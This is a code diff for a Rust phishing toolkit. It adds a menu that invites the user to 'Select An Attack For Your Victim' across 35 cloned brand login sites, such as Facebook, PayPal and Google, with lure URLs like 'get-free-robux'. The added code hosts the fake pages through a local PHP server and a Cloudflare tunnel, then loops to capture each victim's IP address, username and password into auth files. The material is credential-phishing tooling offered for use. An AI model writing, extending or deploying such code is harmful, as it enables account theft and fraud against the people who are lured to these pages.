@@ -1,18 +1,24 @@
-use crate::behind::cli::{error_msg, log_msg};
+use crate::behind::cli::{clear_terminal, error_msg, log_msg};
 use crate::behind::constants::*;
-use crate::behind::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir};
+use crate::behind::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
 
 use colored::Colorize;
-use std::env;
+use std::{env, io, thread, time};
+
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::{exit, Command};
 
 use reqwest::Url;
-use std::fs::{File, OpenOptions};
+use std::fs::{File, OpenOptions, remove_file};
+use std::io::{BufRead, BufReader, Write};
+use std::thread::sleep;
+use std::time::Duration;
 use zip::read::ZipFile;
 use zip::ZipArchive;
 use rayon::prelude::*;
+use regex::Regex;
+use crate::behind::errors::TerminalError;
 
 
 pub fn setup_directories() {
@@ -60,7 +66,7 @@ fn recreate_dir(dir: &Path) {
 
 fn remove_file_if_exists(file: &Path) {
     if file.exists() {
-        handle_error(fs::remove_file(file), "Failed to remove file");
+        handle_error(remove_file(file), "Failed to remove file");
     }
 }
 
@@ -217,7 +223,7 @@ fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
 
                 std::io::copy(&mut file, &mut outfile)?;
             }
-            fs::remove_file(target_path)?;
+            remove_file(target_path)?;
         }
         #[cfg(target_os = "linux")]
         "tgz" => {
@@ -242,7 +248,7 @@ fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
 
 pub fn install_dependencies() {
     log::info!("Checking dependencies");
-    log_msg("Checking for dependencies...");
+    log_msg("Checking for dependencies... (installing them, if they don't exist)");
 
     let exe_path = match env::current_exe() {
         Ok(e) => e,
@@ -318,16 +324,448 @@ pub fn install_dependencies() {
 }
 
 
+pub fn custom_port_input() -> Result<u16, TerminalError> {
+    loop {
+        print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] : ".cyan(), String::new().white());
+        io::stdout().flush()?;
+        let mut selection = String::new();
+        io::stdin().read_line(&mut selection)?;
+        selection = selection.trim().to_string();
+        if selection.is_empty() {
+            log::error!("No input");
+            error_msg("Empty input");
+        }
+        // turn this into a match statement
+        let num: u16 = match selection.parse::<u16>() {
+            Ok(s) => s,
+            Err(_) => {
+                log::error!("Not a number");
+                error_msg("Not a number");
+                continue;
+            }
+        };
 
-// TODO: Add LocalXpose and Localhost.
-// TODO: Add Custom Ports option.
-// TODO: Add setting up site mechanism.
-// TODO: Add IP logger.
-// TODO: Add Credentials logger.
-// TODO: Add Data Capture
+        if !(1024..=9999).contains(&num) {
+            log::error!("Not in range");
+            error_msg("Not in range");
+            continue;
+        }
+        return Ok(num);
+    }
+}
+
+pub fn site_input() -> Result<u16, TerminalError> {
+    loop {
+        print!("{}{}", "Select a site: ".cyan(), String::new().white());
+        io::stdout().flush()?;
+        let mut selection = String::new();
+        io::stdin().read_line(&mut selection)?;
+        selection = selection.trim().to_string();
+        if selection.is_empty() {
+            log::error!("Empty input");
+            error_msg("Empty input");
+        } else {
+            let num: u16 = match selection.parse::<u16>() {
+                Ok(s) => s,
+                Err(_) => {
+                    log::error!("Not a number or out of range");
+                    error_msg("Not a number or out of range");
+                    continue;
+                }
+            };
+            return Ok(num);
+        }
+    }
+}
+
+pub fn site_selection<'a>() -> Result<(&'a str, Option<&'a str>), TerminalError> {
+    let selection = match site_input() {
+        Ok(s) => s,
+        Err(e) => {
+            log::error!("Failed to get site input: {}", e);
+            error_msg(&format!("Failed to get site input: {}", e));
+            return Err("Failed to get site input".into());
+        }
+    };
+    match selection {
+        1 => Ok(("facebook", None)),
+        2 => Ok(("instagram", None)),
+        3 => Ok(("google", None)),
+        4 => Ok(("microsoft", Some("https://unlimited-onedrive-space-for-free"))),
+        5 => Ok(("netflix", Some("https://upgrade-your-netflix-plan-free"))),
+        6 => Ok(("paypal", Some("https://get-500-usd-free-to-your-acount"))),
+        7 => Ok(("steam", Some("https://steam-500-usd-gift-card-free"))),
+        8 => Ok(("twitter", Some("https://get-blue-badge-on-twitter-free"))),
+        9 => Ok(("playstation", Some("https://playstation-500-usd-gift-card-free"))),
+        10 => Ok(("tiktok", Some("https://tiktok-free-liker"))),
+        11 => Ok(("twitch", Some("https://unlimited-twitch-tv-user-for-free"))),
+        12 => Ok(("pinterest", Some("https://get-a-premium-plan-for-pinterest-free"))),
+        13 => Ok(("snapchat", Some("https://view-locked-snapchat-accounts-secretly"))),
+        14 => Ok(("linkedin", Some("https://get-a-premium-plan-for-linkedin-free"))),
+        15 => Ok(("ebay", Some("https://get-500-usd-free-to-your-acount"))),
+        16 => Ok(("quora", Some("https://quora-premium-for-free"))),
+        17 => Ok(("protonmail", Some("https://protonmail-pro-basics-for-free"))),
+        18 => Ok(("spotify", Some("https://convert-your-account-to-spotify-premium"))),
+        19 => Ok(("reddit", Some("https://reddit-official-verified-member-badge"))),
+        20 => Ok(("adobe", Some("https://get-adobe-lifetime-pro-membership-free"))),
+        21 => Ok(("deviantart", Some("https://get-500-usd-free-to-your-acount"))),
+        22 => Ok(("badoo", Some("https://get-500-usd-free-to-your-acount"))),
+        23 => Ok(("origin", Some("https://get-500-usd-free-to-your-acount"))),
+        24 => Ok(("dropbox", Some("https://get-1TB-cloud-storage-free"))),
+        25 => Ok(("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free"))),
+        26 => Ok(("wordpress", Some("https://unlimited-wordpress-traffic-free"))),
+        27 => Ok(("yandex", Some("https://grab-mail-from-anyother-yandex-account-free"))),
+        28 => Ok(("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free"))),
+        29 => Ok(("vk", None)),
+        30 => Ok(("xbox", Some("https://get-500-usd-free-to-your-acount"))),
+        31 => Ok(("mediafire", Some("https://get-1TB-on-mediafire-free"))),
+        32 => Ok(("gitlab", Some("https://get-1k-followers-on-gitlab-free"))),
+        33 => Ok(("github", Some("https://get-1k-followers-on-github-free"))),
+        34 => Ok(("discord", Some("https://get-discord-nitro-free"))),
+        35 => Ok(("roblox", Some("https://get-free-robux"))),
+        99 => Ok(("about", None)),
+        0 => Ok(("exit", None)),
+        _ => {
+            log::error!("Invalid selection");
+            error_msg("Invalid selection, Please try again");
+            Err("Invalid selection".into())
+        }
+    }
+}
+
+
+pub fn start_localhost() -> Result<(), TerminalError> {
+    let custom_port: u16 = custom_port_input()?;
+    log::info!("Starting localhost on port {}", custom_port);
+    println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
+    setup_site()?;
+    clear_terminal()?;
+    banner_small();
+    println!("{} ({})", "Successfully Hosted at : ".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
+    capture_data()?;
+    // TODO: to be implemented
+    Ok(())
+}
+
+pub fn tunnel_menu() -> Result<(), TerminalError> {
+    clear_terminal()?;
+    banner_small();
+    let servers = vec![
+        ("01", "Localhost", None),
+        ("02", "Cloudflared", Some("Auto Detects")),
+        ("03", "LocalXpose", Some("NEW! Max 15Min")),
+    ];
+
+    for (id, server, note) in servers {
+        let colorized_id = format!("[{}]", id).red();
+        let colorized_server = server.truecolor(255, 165, 0);
+        match note {
+            Some(note) => println!("{} {} [{}]", colorized_id, colorized_server, note.cyan()),
+            None => println!("{} {}", colorized_id, colorized_server),
+        }
+    }
+
+    Ok(())
+}
+
+
+pub fn setup_site() -> Result<(), TerminalError> {
+    log::info!("Setting up site");
+    #[cfg(target_os = "windows")]
+    {
+        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
+        let php_path = env::current_dir()?.join("php-bin").join("php.exe");
+        if !php_path.exists() {
+            log::error!("PHP not found");
+            error_msg("PHP not found");
+            return Err("PHP not found".into());
+        }
+        // change into .server directory
+        let sites_dir = get_sites_dir().unwrap_or_else(|| {
+            log::error!("Failed to get sites directory");
+            error_msg("Failed to get sites directory");
+            exit(1);
+        });
+        env::set_current_dir(sites_dir)?;
+
+        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+        let mut cmd = Command::new(php_path);
+        cmd.arg("-S");
+        cmd.arg(format!("{}:{}", HOST, PORT));
+        clear_terminal()?;
+        banner_small();
+        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
+        // change into .server directory
+        let sites_dir = get_sites_dir().unwrap_or_else(|| {
+            log::error!("Failed to get sites directory");
+            error_msg("Failed to get sites directory");
+            exit(1);
+        });
+        env::set_current_dir(sites_dir)?;
+
+        // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+        let mut cmd = Command::new("php");
+        cmd.arg("-S");
+        cmd.arg(format!("{}:{}", HOST, PORT));
+        clear_terminal()?;
+        banner_small();
+        println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
+    }
+    Ok(())
+}
+
+fn capture_ip() -> Result<(), TerminalError> {
+    let ip_file_path = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            exit(1);
+        }
+    }.join("www").join("ip.txt");
+    let mut ip_file = BufReader::new(File::open(ip_file_path)?);
+    let mut ip = String::new();
+    match ip_file.read_line(&mut ip) {
+        Ok(_) => {}
+        Err(e) => {
+            log::error!("Failed to read IP file: {}", e);
+            error_msg(&format!("Failed to read IP file: {}", e));
+            exit(1);
+        }
+    };
+
+    // Extract the IP part
+    if let Some(start) = ip.find("IP: ") {
+        ip = ip[start + 4..].trim().to_string();
+    } else {
+        return Err("IP not found".into());
+    }
+
+    println!("Victim's IP : {}", ip.green());
+    println!("Saved in : auth/ip.txt");
+
+    let mut auth_file = OpenOptions::new().append(true).open("auth/ip.txt")?;
+    writeln!(auth_file, "{}", ip)?;
+
+    Ok(())
+}
+
+fn capture_creds() -> Result<(), TerminalError> {
+    let usernames_file_path = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            exit(1);
+        }
+    }.join("www").join("usernames.txt");
+
+    let file = BufReader::new(File::open(&usernames_file_path)?);
+
+    let mut account = String::new();
+    let mut password = String::new();
+
+    let account_regex = Regex::new(r"Username:\s*(\S*)").unwrap();
+    let password_regex = Regex::new(r"Pass:\s*(\S*)").unwrap();
+
+    for line in file.lines() {
+        let line = line?;
+        if account.is_empty() {
+            if let Some(captures) = account_regex.captures(&line) {
+                account = captures[1].to_string();
+            }
+        }
+        if password.is_empty() {
+            if let Some(captures) = password_regex.captures(&line) {
+                password = captures[1].to_string();
+            }
+        }
+        if !account.is_empty() && !password.is_empty() {
+            break;
+        }
+    }
+
+    println!("Account : {}", account.green());
+    println!("Password : {}", password.green());
+    println!("Saved in : auth/usernames.dat");
+
+    let mut auth_file = OpenOptions::new().append(true).open("auth/usernames.dat")?;
+    let mut original_file = File::open(&usernames_file_path)?;
+    io::copy(&mut original_file, &mut auth_file)?;
+
+    println!("Waiting for Next Login Info, Ctrl + C to exit.");
+
+    Ok(())
+}
+
+pub fn capture_data() -> Result<(), TerminalError> {
+    println!("{} {}", "Waiting for Login Info, Ctrl + C to exit...".yellow(), "Please wait".cyan());
+    let ip_txt = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            exit(1);
+        }
+    }.join("www").join("ip.txt");
+
+    let username_txt = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            exit(1);
+        }
+    }.join("www").join("usernames.txt");
+    loop {
+        if ip_txt.exists() {
+            println!("{} {}", "Victim IP Found !".green(), "Please wait".cyan());
+            capture_ip()?;
+        }
+        sleep(Duration::from_millis(750));
+        if username_txt.exists() {
+            println!("{} {}", "Login info Found !!".green(), "Please wait".cyan());
+            capture_creds()?;
+        }
+        sleep(Duration::from_millis(750));
+    }
+}
+
+
+fn get_cldflr_url() -> Result<String, TerminalError> {
+    let log_file_path = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            return Err("Failed to get server directory".into());
+        }
+    }.join(".cld.log");
+    let file = BufReader::new(File::open(&log_file_path)?);
+    let url_regex = match Regex::new(r"https://[-0-9a-z]*\.trycloudflare\.com") {
+        Ok(r) => r,
+        Err(e) => {
+            log::error!("Failed to create regex: {}", e);
+            error_msg(&format!("Failed to create regex: {}", e));
+            return Err("Failed to create regex".into());
+        }
+    };
+    for line in file.lines() {
+        let line = line?;
+        if let Some(captures) = url_regex.captures(&line) {
+            return Ok(captures[0].to_string());
+        }
+    }
+
+    Err("URL not found".into())
+}
+
+
+pub fn start_cloudflared() -> Result<(), TerminalError> {
+    // remove ".cld.log" file if exists
+    let cld_log = match get_server_dir() {
+        Some(s) => s,
+        None => {
+            log::error!("Failed to get server directory");
+            error_msg("Failed to get server directory");
+            return Err("Failed to get server directory".into());
+        }
+    }.join(".cld.log");
+
+    if cld_log.exists() {
+        match remove_file(&cld_log) {
+            Ok(_) => {}
+            Err(e) => {
+                log::error!("Failed to remove .cld.log file: {}", e);
+                error_msg(&format!("Failed to remove .cld.log file: {}", e));
+                return Err(e.into());
+            }
+        }
+    }
+    setup_site()?;
+    let cus_port: u16 = custom_port_input()?;
+    #[cfg(target_os = "windows")]
+    {
+        let mut cmd = Command::new("cmd");
+        cmd.arg("/c").arg("cloudflared").arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
+        cmd.spawn()?;
+        sleep(Duration::from_secs(8));
+        let url = get_cldflr_url()?;
+        println!("{} {}", "Cloudflared URL:".green(), url.cyan());
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        let cloudflare_file = match ARCH {
+            "x86_64" => "cloudflared-linux-amd64",
+            "aarch64" => "cloudflared-linux-arm64",
+            _ => {
+                log::error!("Unsupported architecture: {}", ARCH);
+                error_msg(&format!("Unsupported architecture: {}", ARCH));
+                return Err("Unsupported architecture".into());
+            }
+        };
+        let mut cmd = Command::new(cloudflare_file);
+        cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
+    }
+    Ok(())
+}
+
+pub fn main_menu() -> Result<(), TerminalError> {
+    clear_terminal()?;
+    banner();
+
+
+    let services: Vec<(&str, (u8, u8, u8))> = vec![
+        ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
+        ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
+        ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
+        ("Snapchat", (255, 252, 0)), ("Linkedin", (0, 119, 181)), ("Ebay", (186, 23, 34)), ("Quora", (185, 43, 39)),
+        ("Protonmail", (84, 172, 210)), ("Spotify", (29, 185, 84)), ("Reddit", (255, 87, 0)), ("Adobe", (237, 23, 43)),
+        ("DeviantArt", (5, 150, 105)), ("Badoo", (230, 74, 25)), ("Origin", (244, 67, 54)), ("DropBox", (0, 126, 229)),
+        ("Yahoo", (150, 0, 155)), ("Wordpress", (33, 117, 155)), ("Yandex", (213, 0, 0)), ("StackOverflow", (244, 67, 54)),
+        ("Vk", (76, 118, 176)), ("XBOX", (16, 124, 16)), ("Mediafire", (49, 80, 195)), ("Gitlab", (233, 30, 99)),
+        ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
+    ];
+
+    println!("{}", "[::] Select An Attack For Your Victim [::]".red());
+
+    for (i, (service, color)) in services.iter().enumerate() {
+        let id = format!("{:2}", i + 1);
+        let colorized_service = service.truecolor(color.0, color.1, color.2);
+        print!("{}) {:<15} ", id.red(), colorized_service);
+        if (i + 1) % 3 == 0 {
+            println!();
+        }
+    }
+
+    // If the number of services is not a multiple of 3, we need to print a new line
+    if services.len() % 3 != 0 {
+        println!();
+    }
+
+    println!("{}) {:<15} ", "99".red(), "About".bright_blue());
+    println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
+    println!();
+    let sel: (&str, Option<&str>) = match site_selection() {
+        Ok(s) => s,
+        Err(e) => {
+            log::error!("Failed to get site selection: {}", e);
+            error_msg(&format!("Failed to get site selection: {}", e));
+            return Err("Failed to get site selection".into());
+        }
+    };
+    // println!("signaled: {se}");
+    Ok(())
+}
+
+// TODO: Add LocalXPose and Localhost.
 // TODO: Add Start with Cloudflare.
-// TODO: Add LocalXpose Auth.
-// TODO: Add Start with LocalXpose.
+// TODO: Add LocalXPose Auth.
+// TODO: Add Start with LocalXPose.
 // TODO: Add Start with Localhost.
 // TODO: Add Tunnel Menu.
 // TODO: Add URL shortener/masking.
